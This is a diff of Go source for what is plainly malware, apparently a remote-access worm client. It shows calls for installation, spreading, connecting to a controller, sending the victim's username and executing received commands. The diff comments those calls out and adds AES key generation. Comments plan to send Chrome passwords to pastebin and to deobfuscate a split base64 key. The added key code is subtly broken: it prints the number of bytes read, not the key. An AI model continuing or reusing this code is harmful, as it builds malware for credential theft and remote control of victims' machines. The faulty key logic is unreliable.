@@ -7,6 +7,7 @@ package main
 
 import "os/user"
 import (
+	"crypto/rand"
 	"fmt"
 	"strings"
 	"time"
@@ -19,13 +20,13 @@ var key_text []byte
 
 func main() {
 	//Check if already running
-	CheckMultiInstances()
-	Install()
-	go Spread()
-	c, _ = Connect()
-	Send("user", GetUsername())
-	go ListenAndExecute()
-	go Reconnect()
+	//CheckMultiInstances()
+	//Install()
+	//go Spread()
+	//c, _ = Connect()
+	//Send("user", GetUsername())
+	//go ListenAndExecute()
+	//go Reconnect()
 
 	//SendData("Ok from client using cap'p")
 
@@ -40,7 +41,15 @@ func main() {
 
 	//Send chrome pass to pastebin
 
-	//Gen aes key,
+	//Gen aes key
+	b := make([]byte, 36)
+	key, err := rand.Read(b)
+	if err != nil {
+		fmt.Println("error:", err)
+		return
+	}
+	fmt.Println(key)
+
 	//Gen
 	//Deofuscate key
 	b64_1 := "fSss" + "L1IkKy"
